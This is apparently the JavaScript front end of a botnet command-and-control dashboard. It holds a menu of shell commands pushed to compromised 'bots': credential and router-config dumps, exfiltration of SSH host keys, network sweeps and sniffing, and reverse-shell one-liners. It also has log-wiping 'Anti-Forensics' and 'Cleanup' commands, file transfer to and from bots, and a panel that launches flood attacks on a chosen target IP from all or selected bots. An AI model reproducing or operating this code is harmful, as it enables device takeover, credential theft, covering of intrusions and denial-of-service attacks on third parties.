  { name: 'GPIO / Serial', cmd: 'ls /dev/tty* /dev/gpio* 2>/dev/null | head -20' },
  { name: 'Dropbear Keys', cmd: 'cat /etc/dropbear/dropbear_rsa_host_key 2>/dev/null | base64 2>/dev/null; ls /etc/dropbear/ 2>/dev/null' },
  { name: 'Router Config', cmd: 'nvram show 2>/dev/null | grep -iE "pass|key|ssid|wan" | head -20; cat /etc/config/wireless 2>/dev/null | head -30' },
  { name: 'NVRAM Dump', cmd: 'nvram show 2>/dev/null | head -80 || cat /dev/mtd1 2>/dev/null | strings | grep -iE "user|pass|ssid|psk|key|wan|dns|route" | head -40' },
  { name: 'MTD Partitions', cmd: 'cat /proc/mtd 2>/dev/null; ls -la /dev/mtd* 2>/dev/null | head -20; echo "=== FLASH ===" && dmesg 2>/dev/null | grep -i "mtd\\|flash\\|spi" | head -10' },
  { name: 'UPnP / SSDP', cmd: 'echo -e "M-SEARCH * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nMAN: ssdp:discover\\r\\nMX: 2\\r\\nST: ssdp:all\\r\\n\\r\\n" | timeout 3 socat - UDP4-DATAGRAM:239.255.255.250:1900 2>/dev/null | head -40 || echo "(socat not available)"' },
  { cat: 'Network Attacks' },
  { name: 'Ping Sweep', cmd: 'SUBNET=$(ip route 2>/dev/null | grep -v default | grep src | head -1 | awk "{print \\$1}"); echo "Sweeping $SUBNET"; for i in $(seq 1 254); do IP="${SUBNET%.*}.$i"; (ping -c1 -W1 $IP &>/dev/null && echo "ALIVE: $IP") & done; wait; echo "done"' },
  { name: 'Port Scan (common)', cmd: 'TARGET=${1:-127.0.0.1}; echo "Scanning $TARGET"; for p in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1521 3306 3389 5432 5900 6379 8080 8443 9200 27017; do (echo >/dev/tcp/$TARGET/$p 2>/dev/null && echo "OPEN: $p") & done; wait' },
  { name: 'Established Connections', cmd: 'ss -tnp state established 2>/dev/null | head -40 || netstat -tnp 2>/dev/null | grep ESTABLISHED | head -40' },
  { name: 'Traffic Sniff (10s)', cmd: 'timeout 10 tcpdump -i any -c 100 -nn "not port 22" 2>/dev/null | head -80 || echo "(tcpdump not available or no permissions)"' },
  { name: 'Firewall Rules', cmd: 'echo "=== IPTABLES ===" && iptables -L -n -v 2>/dev/null | head -40 || echo "(no iptables)"; echo "=== NFTABLES ===" && nft list ruleset 2>/dev/null | head -30 || echo "(no nft)"; echo "=== UFW ===" && ufw status verbose 2>/dev/null || echo "(no ufw)"' },
  { name: 'WiFi Networks', cmd: 'iwlist scan 2>/dev/null | grep -E "ESSID|Signal|Channel" | head -30 || iw dev 2>/dev/null && iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" | head -30 || cat /etc/wpa_supplicant/*.conf 2>/dev/null | grep -E "ssid|psk"' },
  { name: 'VPN / Tunnel Config', cmd: 'ls /etc/openvpn/ /etc/wireguard/ 2>/dev/null; cat /etc/openvpn/*.conf 2>/dev/null | grep -vE "^#|^$" | head -20; cat /etc/wireguard/*.conf 2>/dev/null | head -20; ip tunnel show 2>/dev/null; wg show 2>/dev/null' },
  { cat: 'Anti-Forensics' },
  { name: 'Timestomp File', cmd: 'echo "Usage: touch -r /etc/passwd <target_file>"; ls -la /etc/passwd /bin/ls /usr/bin/env | head -5' },
  { name: 'Process Hiding', cmd: 'echo "=== HIDDEN PROCS ===" && diff <(find /proc -maxdepth 1 -regex "/proc/[0-9]+" -print 2>/dev/null | wc -l) <(ps aux 2>/dev/null | wc -l) 2>/dev/null; echo "=== DELETED BINARIES ===" && find /proc/*/exe -type l 2>/dev/null | xargs ls -la 2>/dev/null | grep deleted | head -10' },
  { name: 'Rootkit Check', cmd: 'echo "=== LD PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null && echo "PRELOAD ACTIVE" || echo "(clean)"; echo "=== LKM ===" && lsmod 2>/dev/null | head -20; echo "=== HIDDEN FILES ===" && find / -name ".*" -type f 2>/dev/null | grep -vE "^\\./(\\.|sys|proc)" | grep -iE "xmr|mine|hack|shell|back|root" | head -10' },
  { name: 'Kernel Modules', cmd: 'lsmod 2>/dev/null | head -30; echo "=== RECENTLY LOADED ===" && dmesg 2>/dev/null | grep -iE "module|insmod|loaded" | tail -10; echo "=== MODPROBE ===" && cat /etc/modprobe.d/*.conf 2>/dev/null | grep -v "^#" | head -10' },
  { cat: 'Util' },
  { name: 'Arch + Libc', cmd: 'uname -m && file /bin/ls 2>/dev/null && ldd --version 2>&1 | head -1; cat /proc/version' },
  { name: 'Available Tools', cmd: 'for t in wget curl python3 python perl ruby php gcc cc nmap socat nc ncat netcat openssl ssh scp rsync busybox docker kubectl gdb strace ltrace tcpdump; do which $t 2>/dev/null && echo "  ✓ $t"; done' },
  { name: 'Writable PATH Dirs', cmd: 'echo $PATH | tr ":" "\\n" | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done; echo "=== PATH ===" && echo $PATH' },
  { name: 'File Download (curl)', cmd: 'echo "curl -sfLO http://YOUR_SERVER/file"; echo "wget -q http://YOUR_SERVER/file"; echo "busybox wget http://YOUR_SERVER/file -O /tmp/file"' },
  { name: 'Reverse Shell Cmds', cmd: 'IP="YOUR_IP"; PORT="YOUR_PORT"; echo "=== BASH ===" && echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"; echo "=== PYTHON ===" && echo "python3 -c \\"import os,pty,socket;s=socket.socket();s.connect((\\x27$IP\\x27,$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\x27/bin/sh\\x27)\\""; echo "=== NC ===" && echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"' },
  { name: 'Disk / Inode Usage', cmd: 'df -h 2>/dev/null; echo "=== INODES ===" && df -i 2>/dev/null | grep -v "Filesystem" | awk \'$5+0 > 50{print}\'; echo "=== BIG FILES ===" && find / -type f -size +100M 2>/dev/null | head -15' },
  { name: 'Last Logins', cmd: 'last -20 2>/dev/null || lastlog 2>/dev/null | grep -v "Never" | head -20; echo "=== FAILED ===" && lastb 2>/dev/null | head -10 || grep -i "failed" /var/log/auth.log 2>/dev/null | tail -10' },
  { name: 'Scheduled Tasks (all)', cmd: 'echo "=== ROOT CRON ===" && crontab -l 2>/dev/null; echo "=== SYSTEM CRON ===" && cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null; echo "=== USER CRONS ===" && for u in $(cut -d: -f1 /etc/passwd); do c=$(crontab -l -u "$u" 2>/dev/null); [ -n "$c" ] && echo "-- $u --" && echo "$c"; done; echo "=== TIMERS ===" && systemctl list-timers --all 2>/dev/null | head -15' },
  { name: 'SELinux / AppArmor', cmd: 'echo "=== SELINUX ===" && getenforce 2>/dev/null || sestatus 2>/dev/null || echo "(no selinux)"; echo "=== APPARMOR ===" && aa-status 2>/dev/null || cat /sys/module/apparmor/parameters/enabled 2>/dev/null || echo "(no apparmor)"; echo "=== SECCOMP ===" && grep Seccomp /proc/self/status 2>/dev/null' },
  { cat: 'Cleanup' },
  { name: 'Clear Logs', cmd: 'echo > /var/log/auth.log 2>/dev/null; echo > /var/log/syslog 2>/dev/null; echo > /var/log/wtmp 2>/dev/null; echo > ~/.bash_history; history -c; echo "logs cleared"' },
  { name: 'Kill Traces', cmd: 'unset HISTFILE && export HISTSIZE=0 && echo "history disabled for session"' },
  { name: 'Wipe Temp', cmd: 'rm -rf /tmp/.* /tmp/* 2>/dev/null; rm -rf /var/tmp/.* 2>/dev/null; echo "tmp wiped"' },
  { name: 'Zero Wtmp/Utmp', cmd: '> /var/log/wtmp 2>/dev/null; > /var/log/utmp 2>/dev/null; > /var/log/lastlog 2>/dev/null; echo "login logs zeroed"' },
];

function buildToolkitMenu() {
  var body = document.getElementById('toolkit-grid-body');
  if (!body) return;
  var q = ((document.getElementById('toolkit-search') || {}).value || '').toLowerCase();

  // Group items by category
  var sections = [], cur = null;
  for (var i = 0; i < toolkitItems.length; i++) {
    var t = toolkitItems[i];
    if (t.cat) { cur = { cat: t.cat, items: [] }; sections.push(cur); }
    else if (cur) cur.items.push({ idx: i, name: t.name, cmd: t.cmd });
  }

  var html = '';
  sections.forEach(function (sec) {
    var items = q
      ? sec.items.filter(function (it) { return it.name.toLowerCase().indexOf(q) !== -1 || it.cmd.toLowerCase().indexOf(q) !== -1; })
      : sec.items;
    if (!items.length) return;
    html += '<div class="toolkit-section">';
    html += '<div class="toolkit-section-header">' + escHtml(sec.cat) + '</div>';
    html += '<div class="toolkit-section-grid">';
    items.forEach(function (it) {
      var prev = it.cmd.length > 55 ? it.cmd.slice(0, 55) + '…' : it.cmd;
      html += '<div class="toolkit-item" onclick="runToolkitItem(' + it.idx + ')" title="' + escHtml(it.cmd) + '">' +
        '<div class="toolkit-item-name">' + escHtml(it.name) + '</div>' +
        '<div class="toolkit-item-preview">' + escHtml(prev) + '</div></div>';
    });
    html += '</div></div>';
  });
  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">No matches</div>';
}

function toggleToolkit() {
  var menu = document.getElementById('shell-toolkit-menu');
  if (menu.classList.contains('open')) {
    menu.classList.remove('open');
  } else {
    buildToolkitMenu();
    menu.classList.add('open');
    // Close on outside click
    setTimeout(function () {
      document.addEventListener('click', closeToolkitOutside);
    }, 0);
  }
}

function closeToolkitOutside(e) {
  var wrap = document.getElementById('shell-toolkit-wrap');
  if (wrap && !wrap.contains(e.target)) {
    document.getElementById('shell-toolkit-menu').classList.remove('open');
    document.removeEventListener('click', closeToolkitOutside);
  }
}

function runToolkitItem(idx) {
  var t = toolkitItems[idx];
  if (!t || !t.cmd) return;
  document.getElementById('shell-toolkit-menu').classList.remove('open');
  document.removeEventListener('click', closeToolkitOutside);
  if (ptyMode && ptyTerm && shellWS && shellWS.readyState === 1) {
    // In PTY mode: type the command + Enter into the terminal
    shellWS.send(JSON.stringify({ type: 'pty_input', data: t.cmd + '\r' }));
  } else {
    shellSendCmd(t.cmd);
  }
}

function shellNetScan() {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var cmd = 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null';
  shellSendCmd(cmd);
}

function shellStartSocks() {
  if (!shellBotID) return;
  popupStartSocks(shellBotID);
}

// ---------------------------------------------------------------------------
// File transfer: download from bot, upload to bot
// ---------------------------------------------------------------------------

// Trigger browser download from base64 data received via WebSocket
function shellTriggerDownload(filename, b64data) {
  try {
    var raw = atob(b64data);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
    var blob = new Blob([bytes], { type: 'application/octet-stream' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    a.click();
    URL.revokeObjectURL(a.href);
    appendOutput('[download] saved: ' + filename + ' (' + bytes.length + ' bytes)\n');
    showToast('Downloaded ' + filename, true);
  } catch (ex) {
    appendOutput('[download] failed to decode file: ' + ex.message + '\n');
    showToast('Download decode failed', false);
  }
}

// Download a file from the bot (send !download command)
function shellDownloadFile(name) {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var path = name;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' !download ' + path + '\n');
  shellWS.send(JSON.stringify({ command: '!download ' + path }));
  shellHistory.push('!download ' + path);
  shellHistIdx = shellHistory.length;
}

// Open file picker and upload to bot
function shellUploadFile() {
  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
  var input = document.createElement('input');
  input.type = 'file';
  input.onchange = function () {
    if (!input.files || !input.files[0]) return;
    var file = input.files[0];
    if (file.size > 10 * 1024 * 1024) {
      showToast('File too large (max 10MB)', false);
      return;
    }
    var reader = new FileReader();
    reader.onload = function () {
      var b64 = reader.result.split(',')[1];
      var dest = '/tmp/' + file.name;
      appendOutput('[upload] sending ' + file.name + ' (' + file.size + ' bytes) -> ' + dest + '\n');
      shellWS.send(JSON.stringify({
        type: 'upload',
        fileName: dest,
        data: b64
      }));
      shellHistory.push('!upload ' + dest);
      shellHistIdx = shellHistory.length;
    };
    reader.readAsDataURL(file);
  };
  input.click();
}

// Drag-and-drop upload onto shell terminal
(function () {
  var term = document.getElementById('shell-output');
  if (!term) return;
  term.addEventListener('dragover', function (e) {
    e.preventDefault();
    e.stopPropagation();
    term.classList.add('shell-dragover');
  });
  term.addEventListener('dragleave', function (e) {
    e.preventDefault();
    e.stopPropagation();
    term.classList.remove('shell-dragover');
  });
  term.addEventListener('drop', function (e) {
    e.preventDefault();
    e.stopPropagation();
    term.classList.remove('shell-dragover');
    if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
    var files = e.dataTransfer.files;
    if (!files || !files.length) return;
    var file = files[0];
    if (file.size > 10 * 1024 * 1024) { showToast('File too large (max 10MB)', false); return; }
    var reader = new FileReader();
    reader.onload = function () {
      var b64 = reader.result.split(',')[1];
      var dest = '/tmp/' + file.name;
      appendOutput('[upload] sending ' + file.name + ' (' + file.size + ' bytes) -> ' + dest + '\n');
      shellWS.send(JSON.stringify({
        type: 'upload',
        fileName: dest,
        data: b64
      }));
    };
    reader.readAsDataURL(file);
  });
})();

// ---------------------------------------------------------------------------
// Shell input handler
// ---------------------------------------------------------------------------

document.getElementById('shell-input').addEventListener('keydown', function (e) {
  if (e.key === 'l' && (e.ctrlKey || e.metaKey)) {
    e.preventDefault();
    document.getElementById('shell-output').innerHTML = '';
    return;
  }
  if (e.key === 'c' && (e.ctrlKey || e.metaKey)) {
    e.preventDefault();
    shellCtrlC();
    return;
  }
  if ((e.key === '=' || e.key === '+') && (e.ctrlKey || e.metaKey)) { e.preventDefault(); shellZoom(1); return; }
  if (e.key === '-' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); shellZoom(-1); return; }
  if (e.key === 'F11') { e.preventDefault(); toggleShellMaximize(); return; }

  if (e.key === 'Tab') {
    e.preventDefault();
    if (tcMatches.length > 0) {
      selectTabComplete(tcIdx >= 0 ? tcIdx : 0);
    } else {
      showTabComplete(this);
    }
    return;
  }

  if (e.key === 'Enter') {
    hideTabComplete();
    var cmd = this.value.trim();
    if (!cmd || !shellWS) return;
    var p = document.getElementById('shell-prompt').textContent;
    appendOutput(p + ' ' + cmd + '\n');
    // Use streaming for regular commands (not ! commands, not cd)
    var useStream = !cmd.match(/^!/) && !cmd.match(/^cd(\s|$)/);
    shellWS.send(JSON.stringify({ command: cmd, stream: useStream }));

    // Client-side cwd tracking for prompt (server confirms via pwd output)
    if (cmd.match(/^cd(\s|$)/)) {
      var dir = cmd.replace(/^cd\s*/, '').trim();
      if (!dir || dir === '~') { shellCwd = '~'; }
      else if (dir.match(/^\//)) { shellCwd = dir; }
      else if (dir === '..') {
        if (shellCwd !== '~' && shellCwd !== '/') {
          var parts = shellCwd.split('/'); parts.pop();
          shellCwd = parts.join('/') || '/';
        }
      } else { shellCwd = (shellCwd === '~' ? '~' : shellCwd) + '/' + dir; }
      document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
      updateBreadcrumb();
      pendingCdRefresh = true;
    }

    shellHistory.push(cmd);
    shellHistIdx = shellHistory.length;
    shellCmdLog.push({ ts: Date.now(), cmd: cmd });
    renderHistoryPanel();
    this.value = '';
  } else if (e.key === 'ArrowUp') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(-1); return; }
    e.preventDefault();
    if (shellHistIdx > 0) { shellHistIdx--; this.value = shellHistory[shellHistIdx]; }
  } else if (e.key === 'ArrowDown') {
    if (tcMatches.length) { e.preventDefault(); navigateTabComplete(1); return; }
    e.preventDefault();
    if (shellHistIdx < shellHistory.length - 1) { shellHistIdx++; this.value = shellHistory[shellHistIdx]; }
    else { shellHistIdx = shellHistory.length; this.value = ''; }
  } else if (e.key === 'Escape') {
    if (tcMatches.length) { hideTabComplete(); return; }
    closeShell();
  } else {
    // Auto-show tab completion for ! prefix
    setTimeout(function () {
      var v = document.getElementById('shell-input').value;
      if (v.startsWith('!') && v.length > 0) showTabComplete(document.getElementById('shell-input'));
      else hideTabComplete();
    }, 0);
  }
});

// ---------------------------------------------------------------------------
// Keyboard shortcuts
// ---------------------------------------------------------------------------

function toggleHelp() {
  var ov = document.getElementById('help-overlay');
  ov.classList.toggle('open');
}

document.addEventListener('keydown', function (e) {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') return;
  if (e.key === '?') { e.preventDefault(); toggleHelp(); return; }
  if (e.key === 's' || e.key === '/') {
    e.preventDefault();
    var botsTab = document.querySelector('[data-tab="tab-bots"]');
    if (botsTab && !botsTab.classList.contains('active')) switchTab(botsTab);
    document.getElementById('bot-search').focus();
  }
  if (e.key >= '1' && e.key <= '9') {
    var tabs = ['tab-bots', 'tab-socks', 'tab-attack', 'tab-activity', 'tab-relays', 'tab-tasks', 'tab-users', 'tab-scanners', 'tab-results'];
    var tab = document.querySelector('[data-tab="' + tabs[parseInt(e.key) - 1] + '"]');
    if (tab) switchTab(tab);
  }
  if (e.key === 'r' || e.key === 'R') { refreshCurrentTab(); }
  if (e.key === 'Escape') {
    var helpOv = document.getElementById('help-overlay');
    if (helpOv && helpOv.classList.contains('open')) { toggleHelp(); return; }
    closeShell(); closeBotPopup();
    var ov = document.getElementById('relay-picker-overlay'); if (ov) ov.remove();
    var nd = document.getElementById('notif-drawer');
    if (nd.classList.contains('open')) toggleNotifs();
  }
});

// ---------------------------------------------------------------------------
// Column Sorting
// ---------------------------------------------------------------------------

var sortField = '', sortAsc = true;

function sortBots(field) {
  if (sortField === field) { sortAsc = !sortAsc; }
  else { sortField = field; sortAsc = true; }

  // Update arrow indicators
  document.querySelectorAll('.sort-arrow').forEach(function (el) { el.textContent = ''; });
  var arrow = document.getElementById('sort-' + field);
  if (arrow) arrow.textContent = sortAsc ? '\u25B2' : '\u25BC';

  // Sort the bots array and re-render
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr.slice();
  bots.sort(function (a, b) {
    var va = a[field], vb = b[field];
    // Handle group field
    if (field === 'group') { va = va || ''; vb = vb || ''; }
    // Numeric fields
    if (typeof va === 'number' && typeof vb === 'number') {
      return sortAsc ? va - vb : vb - va;
    }
    // Boolean fields
    if (typeof va === 'boolean') {
      return sortAsc ? (va === vb ? 0 : va ? -1 : 1) : (va === vb ? 0 : va ? 1 : -1);
    }
    // String fields
    va = String(va || '').toLowerCase();
    vb = String(vb || '').toLowerCase();
    if (va < vb) return sortAsc ? -1 : 1;
    if (va > vb) return sortAsc ? 1 : -1;
    return 0;
  });

  // Re-order DOM rows
  var tbody = document.getElementById('bot-tbody');
  bots.forEach(function (b) {
    var row = document.getElementById('bot-' + sanitizeId(b.botID));
    if (row) tbody.appendChild(row);
  });

  // Update order tracking
  botOrder = bots.map(function (b) { return b.botID; });
  window._botsArr = bots;
  lsSet('sort', { field: sortField, asc: sortAsc });
}

// ---------------------------------------------------------------------------
// Compact Mode
// ---------------------------------------------------------------------------

var compactMode = false;

function refreshAll() {
  fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
  fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
  fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
  showToast('Refreshed', true);
}

function toggleCompactMode() {
  compactMode = !compactMode;
  var wrap = document.getElementById('bot-table-wrap');
  var btn = document.getElementById('compact-toggle');
  if (compactMode) { wrap.classList.add('compact'); btn.classList.add('active'); }
  else { wrap.classList.remove('compact'); btn.classList.remove('active'); }
  lsSet('compact', compactMode);
}

// ---------------------------------------------------------------------------
// Command Bar Toggle
// ---------------------------------------------------------------------------

function refreshCurrentTab() {
  var active = document.querySelector('.tab.active');
  if (!active) return;
  var tab = active.getAttribute('data-tab');
  showToast('Refreshing...', true);
  switch (tab) {
    case 'tab-bots':
      fetch('/api/bots').then(function (r) { return r.json() }).then(function (bots) { updateBots(bots); });
      fetch('/api/stats').then(function (r) { return r.json() }).then(function (d) { updateStats(d); });
      break;
    case 'tab-socks':
      fetch('/api/bots').then(function (r) { return r.json() }).then(function (bots) { updateBots(bots); });
      break;
    case 'tab-attack':
      loadAttackHistory();
      fetch('/api/stats').then(function (r) { return r.json() }).then(function (d) { updateStats(d); });
      break;
    case 'tab-activity':
      fetch('/api/activity').then(function (r) { return r.json() }).then(function (e) { renderActivityFull(e); });
      break;
    case 'tab-relays':
      loadRelays(); loadRelayAPIStatus(); loadWebhooks();
      break;
    case 'tab-tasks':
      loadTasks();
      break;
    case 'tab-users':
      loadUsers();
      break;
    case 'tab-scanners':
      sshRefreshStatus(); sshRefreshHits(); httpExplRefreshHits();
      break;
    case 'tab-results':
      scanJobRefresh(); scanJobRefreshHits(); scanJobRefreshBotStats();
      break;
  }
}

function toggleAnalytics() {
  var row = document.getElementById('analytics-row');
  var arrow = document.getElementById('analytics-arrow');
  row.classList.toggle('collapsed');
  var open = !row.classList.contains('collapsed');
  if (arrow) arrow.innerHTML = open ? '&#9660;' : '&#9654;';
  lsSet('analyticsOpen', open);
}

function toggleCmdBar() {
  var bar = document.getElementById('cmd-bar');
  bar.classList.toggle('collapsed');
  lsSet('cmdCollapsed', bar.classList.contains('collapsed'));
}

// ---------------------------------------------------------------------------
// Command Category Filter
// ---------------------------------------------------------------------------
function switchCmdCat(btn) {
  var cats = document.querySelectorAll('.cmd-cat');
  cats.forEach(function (c) { c.classList.remove('active'); });
  btn.classList.add('active');
  var cat = btn.getAttribute('data-cat');
  var sel = document.getElementById('cmd-type');
  var opts = sel.options;
  var firstVisible = null;
  for (var i = 0; i < opts.length; i++) {
    var oc = opts[i].getAttribute('data-cat');
    if (oc === cat) {
      opts[i].style.display = '';
      if (!firstVisible) firstVisible = opts[i];
    } else {
      opts[i].style.display = 'none';
    }
  }
  // select first visible if current selection is hidden
  if (sel.options[sel.selectedIndex].style.display === 'none' && firstVisible) {
    sel.value = firstVisible.value;
  }
  updateArgFields();
}

function clearCmdTarget() {
  var inp = document.getElementById('cmd-bot');
  inp.value = '';
  inp.placeholder = 'all bots';
  document.getElementById('cmd-target-clear').style.display = 'none';
}

function targetBot(botID) {
  var bar = document.getElementById('cmd-bar');
  if (bar.classList.contains('collapsed')) { toggleCmdBar(); }
  var inp = document.getElementById('cmd-bot');
  inp.value = botID;
  document.getElementById('cmd-target-clear').style.display = '';
  inp.classList.add('cmd-target-flash');
  setTimeout(function () { inp.classList.remove('cmd-target-flash'); }, 600);
  showToast('Targeting ' + botID, true);
}

// init category filter on load
document.addEventListener('DOMContentLoaded', function () {
  var first = document.querySelector('.cmd-cat.active');
  if (first) switchCmdCat(first);
});

// ---------------------------------------------------------------------------
// Group Stats Card
// ---------------------------------------------------------------------------

function updateGroupStats() {
  if (!window._botsArr || !window._botsArr.length) {
    document.getElementById('s-groups-card').style.display = 'none';
    return;
  }
  var groups = {};
  window._botsArr.forEach(function (b) {
    if (b.group) groups[b.group] = (groups[b.group] || 0) + 1;
  });
  var card = document.getElementById('s-groups-card');
  var wrap = document.getElementById('s-groups');
  if (!Object.keys(groups).length) { card.style.display = 'none'; return; }
  card.style.display = '';
  wrap.innerHTML = '';
  Object.entries(groups).forEach(function (e) {
    var c = groupColors[groupColorIndex(e[0])];
    var s = document.createElement('span');
    s.className = 'arch-pill';
    s.style.cssText = 'background:' + c.bg + ';color:' + c.fg + ';border-color:' + c.border;
    s.textContent = e[0] + ': ' + e[1];
    wrap.appendChild(s);
  });
}

// ---------------------------------------------------------------------------
// Attack Panel
// ---------------------------------------------------------------------------

var atkMethods = [];

function loadAttackMethods() {
  fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
    atkMethods = methods;
    var udpGrp = document.getElementById('atk-udp-group');
    var tcpGrp = document.getElementById('atk-tcp-group');
    var l3Grp = document.getElementById('atk-l3-group');
    if (!udpGrp) return;
    udpGrp.innerHTML = ''; tcpGrp.innerHTML = ''; l3Grp.innerHTML = '';
    methods.forEach(function (m) {
      var opt = document.createElement('option');
      opt.value = m.id;
      opt.textContent = m.name;
      if (m.category === 'udp') udpGrp.appendChild(opt);
      else if (m.category === 'tcp') tcpGrp.appendChild(opt);
      else l3Grp.appendChild(opt);
    });
    updateAtkMethodInfo();
  }).catch(function () { });
}

function updateAtkMethodInfo() {
  var sel = document.getElementById('atk-method');
  var desc = document.getElementById('atk-desc');
  var optsDiv = document.getElementById('atk-opts');
  if (!sel || !desc) return;
  var id = sel.value;
  var m = atkMethods.find(function (x) { return x.id === id; });
  desc.textContent = m ? m.category.toUpperCase() + ' | ' + m.desc : '';

  // rebuild advanced options for this method
  if (!optsDiv) return;
  optsDiv.innerHTML = '';
  if (!m || !m.options || m.options.length === 0) {
    optsDiv.innerHTML = '<div style="opacity:0.5;padding:8px">No advanced options for this method</div>';
    return;
  }
  m.options.forEach(function (o) {
    var div = document.createElement('div');
    div.className = 'atk-opt';
    if (o.tooltip) div.setAttribute('title', o.tooltip);
    var lbl = document.createElement('label');
    lbl.textContent = o.label;
    if (o.tooltip) {
      var hint = document.createElement('span');
      hint.className = 'atk-opt-hint';
      hint.textContent = '?';
      hint.setAttribute('title', o.tooltip);
      lbl.appendChild(hint);
    }
    var inp = document.createElement('input');
    inp.type = 'text';
    inp.id = 'atk-opt-' + o.key;
    inp.placeholder = o.default !== undefined && o.default !== '' ? o.default : '\u2014';
    inp.value = o.default || '';
    inp.setAttribute('data-key', o.key);
    inp.setAttribute('data-default', o.default || '');
    inp.setAttribute('autocomplete', 'off');
    div.appendChild(lbl);
    div.appendChild(inp);
    optsDiv.appendChild(div);
  });
}

function toggleAtkAdvanced() {
  var adv = document.getElementById('atk-advanced');
  adv.style.display = adv.style.display === 'none' ? '' : 'none';
}

// ---------------------------------------------------------------------------
// Custom confirm modal (replaces native confirm() dialogs)
// opts: { title, message, details: [{label,val}], icon:'danger'|'warn',
//         confirmText, confirmClass:'danger'|'warn', onConfirm }
// ---------------------------------------------------------------------------
function showConfirm(opts) {
  var old = document.getElementById('confirm-overlay');
  if (old) old.remove();

  var detailsHtml = '';
  if (opts.details && opts.details.length) {
    detailsHtml = '<div class="confirm-details">';
    opts.details.forEach(function (d) {
      detailsHtml += '<span class="cd-label">' + escHtml(d.label) + '</span>';
      detailsHtml += '<span class="cd-val">' + escHtml(d.val) + '</span>';
    });
    detailsHtml += '</div>';
  }

  var iconClass = opts.icon || 'danger';
  var iconChar = iconClass === 'warn' ? '\u26A0' : '\u26A1';
  var btnClass = opts.confirmClass || 'danger';

  var overlay = document.createElement('div');
  overlay.id = 'confirm-overlay';
  overlay.className = 'confirm-overlay';
  overlay.innerHTML =
    '<div class="confirm-box">' +
    '<div class="confirm-header">' +
    '<div class="confirm-icon ' + iconClass + '">' + iconChar + '</div>' +
    '<div class="confirm-title">' + escHtml(opts.title || 'Confirm') + '</div>' +
    '</div>' +
    '<div class="confirm-body">' +
    '<div class="confirm-msg">' + escHtml(opts.message || '') + '</div>' +
    detailsHtml +
    '</div>' +
    '<div class="confirm-footer">' +
    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
    '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
    escHtml(opts.confirmText || 'Confirm') +
    '</button>' +
    '</div>' +
    '</div>';

  document.body.appendChild(overlay);
  requestAnimationFrame(function () { overlay.classList.add('open'); });

  function close() {
    overlay.classList.remove('open');
    setTimeout(function () { overlay.remove(); }, 160);
  }

  document.getElementById('confirm-cancel').onclick = close;
  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
  document.getElementById('confirm-ok').onclick = function () {
    close();
    if (opts.onConfirm) opts.onConfirm();
  };

  // Esc key
  function onKey(e) { if (e.key === 'Escape') { close(); document.removeEventListener('keydown', onKey); } }
  document.addEventListener('keydown', onKey);
}

function fireAttack() {
  var method = document.getElementById('atk-method').value;
  var target = document.getElementById('atk-target').value.trim();
  var port = document.getElementById('atk-port').value.trim() || '80';
  var duration = document.getElementById('atk-duration').value.trim() || '30';
  var botID = document.getElementById('atk-bot').value.trim();
  var atkGroup = document.getElementById('atk-group').value;
  var archFilter = document.getElementById('atk-arch').value;
  var minRAM = parseInt(document.getElementById('atk-ram').value) || 0;

  if (!target) { showToast('Enter a target IP', false); return; }
  if (!method) { showToast('Select a method', false); return; }

  // Build command: !attack method ip port duration [key=val ...]
  var cmd = '!attack ' + method + ' ' + target + ' ' + port + ' ' + duration;

  // Gather advanced options dynamically from rendered fields (skip defaults)
  var optInputs = document.querySelectorAll('#atk-opts input[data-key]');
  optInputs.forEach(function (inp) {
    var val = inp.value.trim();
    var def = inp.getAttribute('data-default') || '';
    if (val && val !== def) cmd += ' ' + inp.getAttribute('data-key') + '=' + val;
  });

  var m = atkMethods.find(function (x) { return x.id === method; });
  var mName = m ? m.name : method;
  var filterParts = [];
  if (botID) filterParts.push('Bot: ' + botID);
  else if (atkGroup) filterParts.push('Group: ' + atkGroup);
  else filterParts.push('ALL bots');
  if (archFilter) filterParts.push('arch=' + archFilter);
  if (minRAM) filterParts.push('RAM>=' + minRAM + 'MB');
  var scope = filterParts.join(', ');

  showConfirm({
    title: 'Launch Attack',
    message: 'You are about to fire an attack with the following parameters:',
    icon: 'danger',
    details: [
      { label: 'Method', val: mName },
